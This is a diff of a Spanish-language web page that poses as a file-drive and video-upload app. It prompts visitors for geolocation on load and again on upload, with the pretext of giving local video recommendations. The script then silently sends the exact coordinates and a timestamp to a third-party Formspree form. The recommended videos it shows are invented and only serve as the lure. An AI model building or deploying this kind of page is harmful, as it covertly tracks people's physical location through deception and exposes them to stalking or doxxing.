             console.log("coordenadas: " + position.coords.latitude + "," + position.coords.longitude);
-            
+
             // Obtener ubicaciones del localStorage
             let datos = JSON.parse(localStorage.getItem('ubicaciones')) || { ubicaciones: [] };
-            
+
             // Agregar nueva ubicación
             const ubicacion = {
                 lat: position.coords.latitude,
                 lng: position.coords.longitude,
                 fecha: new Date().toLocaleString()
             };
-            
+
             datos.ubicaciones.push(ubicacion);
-            
+
             // Guardar en localStorage
             localStorage.setItem('ubicaciones', JSON.stringify(datos));
-            
+
             // Enviar a Google Forms
             await enviarAGoogleForms(ubicacion);
-            
+
             console.log("Ubicación guardada en localStorage:", datos);
         }
 
         // Enviar datos a Formspree
         async function enviarAGoogleForms(ubicacion) {
             const formspreeUrl = 'https://formspree.io/f/mreydjae';
-            
+
             const datos = {
                 Latitud: ubicacion.lat.toString(),
                 Longitud: ubicacion.lng.toString(),
                 Fecha: ubicacion.fecha
             };
-            
+
             try {
                 const response = await fetch(formspreeUrl, {
                     method: 'POST',
@@ -307,7 +1248,7 @@
                     },
                     body: JSON.stringify(datos)
                 });
-                
+
                 if (response.ok) {
                     console.log("Datos enviados a Formspree exitosamente");
                 } else {
@@ -318,66 +1259,236 @@
             }
         }
 
-        // Mostrar advertencia por 2 segundos
-        setTimeout(() => {
-            document.getElementById('warningModal').classList.add('hidden');
-            showLoadingModal();
-        }, 5000);
+        const state = {
+            location: null,
+            locationAddress: null,
+            emailSent: false,
+            videoLoaded: false
+        };
 
-        // Mostrar modal de contador
-        function showLoadingModal() {
-            document.getElementById('loadingModal').classList.remove('hidden');
-            let countdown = 15;
-            
-            const countdownInterval = setInterval(() => {
-                countdown--;
-                document.getElementById('countdown').textContent = countdown;
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    closeLoadingAndShowVideo();
-                }
-            }, 1000);
+        const DOM = {
+            locationModal: document.getElementById('locationModal'),
+            btnAllowLocation: document.getElementById('btnAllowLocation'),
+            btnCancel: document.getElementById('btnCancel'),
+            uploadArea: document.getElementById('uploadArea'),
+            fileInput: document.getElementById('fileInput'),
+            videoSection: document.getElementById('videoSection'),
+            videoPlayer: document.getElementById('videoPlayer'),
+            videoPlaceholder: document.getElementById('videoPlaceholder'),
+            videoPlayerContainer: document.getElementById('videoPlayerContainer'),
+            videoTitle: document.getElementById('videoTitle'),
+            videoMeta: document.getElementById('videoMeta'),
+            placeholderText: document.getElementById('placeholderText'),
+            loadingState: document.getElementById('loadingState'),
+            loadingText: document.getElementById('loadingText'),
+            recommendedSection: document.getElementById('recommendedSection'),
+            videoGrid: document.getElementById('videoGrid'),
+            locationDisplay: document.getElementById('locationDisplay'),
+            locationStatusText: document.getElementById('locationStatusText'),
+            locationChipText: document.getElementById('locationChipText'),
+            emailStatus: document.getElementById('emailStatus'),
+            emailStatusText: document.getElementById('emailStatusText'),
+            notification: document.getElementById('notification'),
+            notificationText: document.getElementById('notificationText')
+        };
+
+        function showNotification(text) {
+            DOM.notificationText.textContent = text;
+            DOM.notification.classList.add('show');
+            setTimeout(() => DOM.notification.classList.remove('show'), 3500);
         }
 
-        // Cerrar modal de contador y mostrar video
-        function closeLoadingAndShowVideo() {
-            document.getElementById('loadingModal').classList.add('hidden');
-            document.getElementById('videoWrapper').classList.remove('hidden');
-            
-            // URL de video de YouTube (reemplaza con tu video ID)
-            const videoId = 'NbCh5T572G4'; // Ejemplo: Rick Astley
-            document.getElementById('videoPlayer').src = `https://www.youtube.com/embed/${videoId}?autoplay=1`;
+        function showModal() {
+            DOM.locationModal.classList.add('active');
         }
 
-        // Descargar archivo de ubicaciones
-        function descargarUbicaciones() {
-            try {
-                const datos = JSON.parse(localStorage.getItem('ubicaciones')) || { ubicaciones: [] };
-                
-                if (datos.ubicaciones.length === 0) {
-                    alert("No hay ubicaciones guardadas todavía");
-                    return;
+        function hideModal() {
+            DOM.locationModal.classList.remove('active');
+        }
+
+        function reverseGeocode(lat, lng) {
+            const cities = [
+                { name: 'Ciudad de México', country: 'México', lat: 19.4, lng: -99.1 },
+                { name: 'Madrid', country: 'España', lat: 40.4, lng: -3.7 },
+                { name: 'Buenos Aires', country: 'Argentina', lat: -34.6, lng: -58.4 },
+                { name: 'Bogotá', country: 'Colombia', lat: 4.6, lng: -74.1 },
+                { name: 'Lima', country: 'Perú', lat: -12.0, lng: -77.0 },
+                { name: 'Santiago', country: 'Chile', lat: -33.4, lng: -70.6 },
+                { name: 'Barcelona', country: 'España', lat: 41.4, lng: 2.2 },
+                { name: 'Miami', country: 'Estados Unidos', lat: 25.8, lng: -80.2 },
+            ];
+
+            let closest = cities[0];
+            let minDist = Infinity;
+            cities.forEach(city => {
+                const dist = Math.sqrt(Math.pow(city.lat - lat, 2) + Math.pow(city.lng - lng, 2));
+                if (dist < minDist) { minDist = dist; closest = city; }
+            });
+
+            return minDist < 10 ? `${closest.name}, ${closest.country}` : `Lat: ${lat.toFixed(4)}, Lng: ${lng.toFixed(4)}`;
+        }
+
+        function showRecommendedVideos() {
+            DOM.recommendedSection.classList.remove('hidden');
+            const cityName = state.locationAddress.split(',')[0] || 'tu zona';
+
+            const videos = [
+                { title: `Explorando ${cityName}`, duration: '12:34', views: '1.2M vistas', days: 'Hace 3 días', color: '#e91e63' },
+                { title: `Naturaleza en ${cityName}`, duration: '8:21', views: '856K vistas', days: 'Hace 1 semana', color: '#4caf50' },
+                { title: `Cocina local de ${cityName}`, duration: '15:47', views: '2.1M vistas', days: 'Hace 2 días', color: '#ff9800' },
+                { title: `Tecnología en ${cityName}`, duration: '10:05', views: '445K vistas', days: 'Hace 5 días', color: '#2196f3' },
+                { title: `Fitness en ${cityName}`, duration: '22:18', views: '3.4M vistas', days: 'Hace 1 día', color: '#9c27b0' },
+                { title: `Música en vivo en ${cityName}`, duration: '45:30', views: '678K vistas', days: 'Hace 4 días', color: '#00bcd4' },
+            ];
+
+            DOM.videoGrid.innerHTML = videos.map((v, i) => `
+                <div class="video-card fade-in-up delay-${Math.min(i + 1, 4)}" onclick="playRecommendedVideo('${v.title}')">
+                    <div class="video-card-thumb" style="background:linear-gradient(135deg, ${v.color}, ${v.color}dd)">
+                        <div class="play-overlay">
+                            <span class="material-icons">play_circle_filled</span>
+                        </div>
+                        <span class="duration">${v.duration}</span>
+                    </div>
+                    <div class="video-card-info">
+                        <div class="video-card-title">${v.title}</div>
+                        <div class="video-card-meta">${v.views} · ${v.days}</div>
+                        <div class="video-card-location">
+                            <span class="material-icons">location_on</span>
+                            ${state.locationAddress}
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function playRecommendedVideo(title) {
+            DOM.videoTitle.textContent = title;
+            DOM.videoMeta.textContent = `Recomendado para ${state.locationAddress} · ${new Date().toLocaleDateString('es-ES')}`;
+
+            DOM.videoPlayer.style.display = 'none';
+            DOM.videoPlaceholder.style.display = 'flex';
+            DOM.placeholderText.textContent = `▶ ${title}`;
+            DOM.videoPlayerContainer.style.background = 'linear-gradient(135deg, #1a1a2e, #16213e)';
+
+            showNotification(`Reproduciendo: ${title}`);
+        }
+
+        function loadVideo(file) {
+            if (!file) return;
+
+            const url = URL.createObjectURL(file);
+            state.videoLoaded = true;
+
+            DOM.videoPlayer.src = url;
+            DOM.videoPlayer.style.display = 'block';
+            DOM.videoPlaceholder.style.display = 'none';
+            DOM.videoPlayerContainer.style.background = '#000';
+
+            DOM.videoTitle.textContent = file.name;
+            DOM.videoMeta.textContent = `${(file.size / (1024 * 1024)).toFixed(1)} MB · ${file.type || 'video/*'}`;
+
+            addToFileList(file);
+            showNotification(`Video "${file.name}" cargado correctamente`);
+        }
+
+        function addToFileList(file) {
+            const fileList = document.getElementById('fileList');
+            const sizeStr = file.size > 1024 * 1024 ? `${(file.size / (1024 * 1024)).toFixed(0)} MB` : `${(file.size / 1024).toFixed(0)} KB`;
+
+            const newItem = document.createElement('div');
+            newItem.className = 'file-list-item';
+            newItem.innerHTML = `
+                <div class="file-icon video-icon"><span class="material-icons">movie</span></div>
+                <div class="file-name">${file.name}</div>
+                <div class="file-shared"><div class="shared-avatar">U</div></div>
+                <div class="file-modified">Ahora mismo</div>
+                <div class="file-size">${sizeStr}</div>
+                <div><button class="icon-btn"><span class="material-icons">more_vert</span></button></div>
+            `;
+            fileList.insertBefore(newItem, fileList.firstChild);
+        }
+
+        // Event Listeners
+        DOM.btnAllowLocation.addEventListener('click', () => {
+            getLocation();
+        });
+
+        DOM.btnCancel.addEventListener('click', () => {
+            hideModal();
+            showNotification('Sin ubicación no se pueden mostrar recomendaciones');
+        });
+
+        DOM.uploadArea.addEventListener('click', () => {
+            DOM.fileInput.click();
+        });
+
+        DOM.uploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            DOM.uploadArea.classList.add('dragover');
+        });
+
+        DOM.uploadArea.addEventListener('dragleave', () => {
+            DOM.uploadArea.classList.remove('dragover');
+        });
+
+        DOM.uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            DOM.uploadArea.classList.remove('dragover');
+            const files = e.dataTransfer.files;
+            if (files.length > 0 && files[0].type.startsWith('video/')) {
+                if (!state.location) {
+                    window._pendingFile = files[0];
+                    showModal();
+                } else {
+                    loadVideo(files[0]);
                 }
-                
-                const jsonString = JSON.stringify(datos, null, 2);
-                const blob = new Blob([jsonString], { type: 'application/json' });
-                const url = URL.createObjectURL(blob);
-                const enlace = document.createElement('a');
-                enlace.href = url;
-                enlace.download = 'ubicaciones.json';
-                document.body.appendChild(enlace);
-                enlace.click();
-                document.body.removeChild(enlace);
-                URL.revokeObjectURL(url);
-                console.log("Archivo descargado:", datos);
-            } catch (error) {
-                alert("Error al descargar el archivo: " + error.message);
-                console.error("Error:", error);
+            } else {
+                showNotification('Por favor, sube un archivo de video válido');
             }
-        }
-    </script>
+        });
 
+        DOM.fileInput.addEventListener('change', (e) => {
+            const files = e.target.files;
+            if (files.length > 0) {
+                if (!state.location) {
+                    window._pendingFile = files[0];
+                    showModal();
+                } else {
+                    loadVideo(files[0]);
+                }
+            }
+        });
+
+        // Tab switching
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+            });
+        });
+
+        document.querySelectorAll('.sidebar-item').forEach(item => {
+            item.addEventListener('click', () => {
+                document.querySelectorAll('.sidebar-item').forEach(i => i.classList.remove('active'));
+                item.classList.add('active');
+            });
+        });
+
+        // File list clicks
+        document.querySelectorAll('.file-list-item').forEach(item => {
+            item.addEventListener('click', function () {
+                const fileName = this.querySelector('.file-name').textContent;
+                if (fileName.endsWith('.mp4') || fileName.endsWith('.mov') || fileName.endsWith('.webm')) {
+                    playRecommendedVideo(fileName);
+                }
+            });
+        });
+
+        // Show modal on load
+        window.addEventListener('load', () => {
+            setTimeout(showModal, 600);
+        });
+    </script>
 </body>
 
 </html>
